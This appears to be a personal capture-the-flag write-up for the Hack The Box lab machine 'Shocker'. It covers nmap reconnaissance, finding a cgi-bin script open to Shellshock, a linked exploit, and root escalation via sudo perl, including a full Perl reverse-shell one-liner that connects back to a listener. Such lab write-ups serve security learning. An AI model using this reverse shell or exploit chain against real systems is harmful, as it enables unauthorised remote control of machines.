Below is my write-up on Shocker from HTB. 
At the time of writing, the IP address was 10.10.10.56. Unfortunately, I had lost my write-ups for Shocker & Nibbles. I'm rebuilding them, however it is done after the fact and with way less struggling. So let's get started!

let's hit nmap first.

`└──╼ $nmap -T4 -A -v 10.10.10.56`
```
Starting Nmap 7.60 ( https://nmap.org ) at 2018-02-12 07:17 MST
NSE: Loaded 146 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 07:17
Completed NSE at 07:17, 0.00s elapsed
Initiating NSE at 07:17
Completed NSE at 07:17, 0.00s elapsed
Initiating Ping Scan at 07:17
Scanning 10.10.10.56 [2 ports]
Completed Ping Scan at 07:17
Completed Parallel DNS resolution of 1 host. at 07:17, 0.06s elapsed
Initiating Connect Scan at 07:17
Scanning 10.10.10.56 [1000 ports]
Discovered open port 80/tcp on 10.10.10.56
Discovered open port 2222/tcp on 10.10.10.56
Completed Connect Scan at 07:18, 26.81s elapsed (1000 total ports)
Initiating Service scan at 07:18
Scanning 2 services on 10.10.10.56
Completed Service scan at 07:18, 6.59s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.10.56.
Initiating NSE at 07:18
Completed NSE at 07:18, 10.10s elapsed
Initiating NSE at 07:18
Completed NSE at 07:18, 0.00s elapsed
Nmap scan report for 10.10.10.56
Host is up (0.42s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (EdDSA)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 07:18
Completed NSE at 07:18, 0.00s elapsed
Initiating NSE at 07:18
Completed NSE at 07:18, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.62 seconds
```


Hmm ok. Well, we've got web and ssh. Let's hit the website and see what's up!
![](https://github.com/ICMPofDED/ICMPofDED.github.io/blob/master/images/shocker1.jpg?raw=true)
Nothing too interesting there..source?

```
> <!DOCTYPE html><html><body>
><h2>Don't Bug Me!</h2><img src="bug.jpg" alt="bug" style="width:450px;height:350px;">
></body></html> 
```

Ok yeah, still not much to go on here. Let's try to find any other pages on the site. 

![](https://github.com/ICMPofDED/ICMPofDED.github.io/blob/master/images/shocker2.jpg?raw=true)

Hmm...Disappointing. 
Not really much to go on here.

Thinking about the name of the box, I'm guessing shocker had to do with the shellshock vulnerability. However, I am not seeing anything in the cgi-bin folder that is exploitable. I even downloaded a special cgi-bin wordlist. What am I missing?
Ok, I figured it out. Apparently I was looking for only bin, py and didn't do a search for .sh. So I found user.sh in the cgi-bin folder and now we have our way in.
So in terms of the actual exploit, I found [this neat python script](https://gist.github.com/matjohn2/bc9689c60d4c9c5a2538/) from user [matjohn2 on github](https://github.com/matjohn2/) Thanks, matjohn2!

Super simple, it has the reverse shell built in! So I launch that and Aw yes, we got that userrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr!

![](https://github.com/ICMPofDED/ICMPofDED.github.io/blob/master/images/shocker3.jpg?raw=true)


Sup' shelly what have you got in store for us?

![](https://github.com/ICMPofDED/ICMPofDED.github.io/blob/master/images/shocker4.jpg?raw=true)

After minimal enumeration 
`sudo -l`
I found this...

![](https://github.com/ICMPofDED/ICMPofDED.github.io/blob/master/images/shocker5.jpg?raw=true)

Whaaaat, Shelly you shouldn't have. (Really, you shouldn't have!)

So it's just as simple as starting up another netcat listener terminal window and sending this glorious reverse shell: 

```
sudo perl -e 'use Socket;$i="myip";$p=myport;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```


![](https://github.com/ICMPofDED/ICMPofDED.github.io/blob/master/images/shocker6.jpg?raw=true)

![](https://github.com/ICMPofDED/ICMPofDED.github.io/blob/master/images/shocker7.jpg?raw=true)

My face when I saw that: 


![](https://github.com/ICMPofDED/ICMPofDED.github.io/blob/master/images/shocker8.jpg?raw=true)



So now that this box is all said and done, I did struggle a lot before I realized it was shellshock. I even remember examining the image of the "bug" for steganagrophy. My lesson for this write-up...Make backups of your notes :). Thanks again for reading!
